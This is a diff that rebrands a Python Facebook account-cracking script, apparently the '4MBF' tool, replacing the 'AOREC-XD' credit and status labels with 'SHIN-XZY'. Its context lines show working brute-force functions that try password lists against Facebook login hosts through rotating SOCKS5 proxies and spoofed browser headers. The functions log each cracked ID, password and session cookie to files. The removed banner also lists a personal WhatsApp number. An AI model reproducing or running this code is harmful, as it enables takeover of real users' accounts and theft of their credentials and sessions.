@@ -148,14 +148,16 @@ def banner():
 
 
 	ban='''
-•   AUTHOR  : AOREC-XD WHATSAPP : 081908010667  •
-•   _____ _______  ____________________         •
-•   __  // /__   |/  /__  __ )__  ____/         •
-•   _  // /__  /|_/ /__  __  |_  /_             •
-•   /__  __/  /  / / _  /_/ /_  __/             •
-•     /_/  /_/  /_/  /_____/ /_/ VERSION 4.0.4  •
-•                                               •
-•   GITHUB : HTTPS://GITHUB.COM/AOREC-XD/4MBF   •'''
+     _____ __  _______   _________  __ 
+    / ___// / / /  _/ | / /__  /\ \/ / 
+   \__ \/ /_/ // //  |/ /  / /  \  /
+  ___// __  // // /|  /  / /__ / /
+/____/_/ /_/___/_/ |_/  /____//_/
+                  ____  _    __              __
+    ____ ___  __  __/ / /_(_)  / /_____  ____  / /____
+   / __ `__ \/ / / / / __/ /  / __/ __ \/ __ \/ / ___/
+  / / / / / / /_/ / / /_/ /  / /_/ /_/ / /_/ / (__  )
+/_/ /_/ /_/\__,_/_/\__/_/   \__/\____/\____/_/____/ '''
 	oi = nel(tekz(ban,justify='center',style='bold'), style='cyan')
 	cetak(nel(oi, title='[bold cyan] • DEVELOVER INFORMATION • [/bold cyan]'))
 # VALIDASI TOKEN
@@ -954,7 +956,7 @@ def crack(idf,pwv,nmf):
 	nip=random.choice(prox)
 	ses=requests.Session()
 	proxs= {'http': 'socks5://'+nip}
-	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write('\r%s SHIN %s/%s [ LIVE:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
 		try:
 			secua=re.findall(' Chrome/(.*?)Mobile Safari/537.36',str(ua))[0].split('.')[0]
@@ -985,7 +987,7 @@ def crack(idf,pwv,nmf):
 						statuscp = f'\r[•] ID       : {idf} \n[•] PASSWORD : {pw} \n[•] NAME : {nmf}'
 						open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='AOREC-XD CP'))
+					cetak(nel(statuscp1, title='SHIN-XZY CP'))
 					cp+=1
 				else:continue
 				break
@@ -998,7 +1000,7 @@ def crack(idf,pwv,nmf):
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='AOREC-XD OK'))
+					cetak(nel(statusok1, title='SHIN-XZY LIVE'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
@@ -1056,7 +1058,7 @@ def crack(idf,pwv,nmf):
 					print('\n')
 					statusok = f'[bold green]\r[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]AOREC XD OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]SHIN-XZY LIVE[/bold green]'))
 					ok+=1
 					break
 
@@ -1078,7 +1080,7 @@ def crackfree(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write('\r%s SHIN %s/%s [ LIVE:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
 		try:
 			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
@@ -1096,7 +1098,7 @@ def crackfree(idf,pwv):
 					print('\n')
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='AOREC-XD CP'))
+					cetak(nel(statuscp1, title='SHIN CP'))
 					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -1111,7 +1113,7 @@ def crackfree(idf,pwv):
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='AOREC-XD OK'))
+					cetak(nel(statusok1, title='SHIN LIVE'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
@@ -1140,7 +1142,7 @@ def crackfree(idf,pwv):
 					print('\n')
 					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]SHIN LIVE[/bold green]'))
 					ok+=1
 					break
 
@@ -1162,7 +1164,7 @@ def cracktouch(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write('\r%s SHIN %s/%s [ LIVE:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
 		try:
 			ses.headers.update({'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
@@ -1180,7 +1182,7 @@ def cracktouch(idf,pwv):
 					print('\n')
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='AOREC-XD CP'))
+					cetak(nel(statuscp1, title='SHIN CP'))
 					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -1195,7 +1197,7 @@ def cracktouch(idf,pwv):
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='AOREC-XD OK'))
+					cetak(nel(statusok1, title='SHIN LIVE'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
@@ -1224,7 +1226,7 @@ def cracktouch(idf,pwv):
 					print('\n')
 					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]SHIN LIVE[/bold green]'))
 					ok+=1
 					break
 
@@ -1244,7 +1246,7 @@ def crackmbasic(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write('\r%s SHIN %s/%s [ LIVE:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
 		try:
 
@@ -1263,7 +1265,7 @@ def crackmbasic(idf,pwv):
 					print('\n')
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='AOREC-XD CP'))
+					cetak(nel(statuscp1, title='SHIN CP'))
 					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -1307,7 +1309,7 @@ def crackmbasic(idf,pwv):
 					print('\n')
 					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]SHIN OK[/bold green]'))
 					ok+=1
 					break
 
